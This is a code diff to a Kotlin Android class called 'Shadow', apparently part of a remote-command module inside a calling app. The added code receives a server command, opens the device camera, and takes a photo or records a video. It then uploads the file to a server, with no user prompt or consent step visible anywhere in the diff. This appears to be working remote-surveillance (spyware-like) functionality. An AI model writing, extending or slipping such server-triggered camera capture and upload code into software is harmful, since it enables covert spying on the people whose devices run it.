@@ -1,9 +1,17 @@
 package com.hc.calling.commands.shadow
 
 import android.content.Context
+import android.hardware.camera2.CameraDevice
+import android.os.Handler
+import android.view.Surface
 import com.hc.calling.commands.Command
 import com.hc.calling.commands.Executor
+import com.hc.calling.commands.shadow.data.ShadowVM
 import com.hc.calling.commands.shadow.util.Photographer
+import com.hc.calling.commands.shadow.util.VideoRecoder
+import com.hc.calling.util.DateUtil
+import com.orhanobut.logger.Logger
+import java.io.File
 
 /**
  * Created by ChanHong on 2019/3/27
@@ -40,14 +48,45 @@ class Shadow(context: Context) : Command(), Executor {
         val serverCommand = data[0]
         val camera = data[1] as String
 
-        when (serverCommand) {
-            SEND_PIC -> {
-//                Photographer(mContext).openCamera(camera).capture()
-            }
+        Photographer(
+            mContext
+        ) { builder, session, device, imageReader, surfaces, handler ->
+            when (serverCommand) {
+                SEND_PIC -> {
 
-            SEND_VIDEO -> {
+                    // take photo and post the photo to server
+                    Photographer.capture(mContext, builder, session, imageReader, device, handler) {
+                        ShadowVM().upLoadPic(File(it)) { data ->
+                            Logger.i(data)
+                        }
+                    }
+                }
+                SEND_VIDEO -> {
+                    record(device, surfaces, handler)
+                }
             }
         }
+            .openCamera(camera)
+
+    }
+
+
+    /**
+     * upload the video when record complete
+     */
+    fun record(device: CameraDevice, surface: MutableList<Surface>, handler: Handler) {
+        val path = File(mContext.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp4").path
+        VideoRecoder {
+            ShadowVM().upLoadPic(File(it)) { data ->
+                Logger.i(data)
+            }
+        }
+            .apply {
+                initMediaRecorde(path)
+                    .apply {
+                        requestRecord(device, surface, handler)
+                    }
+            }
 
     }
 
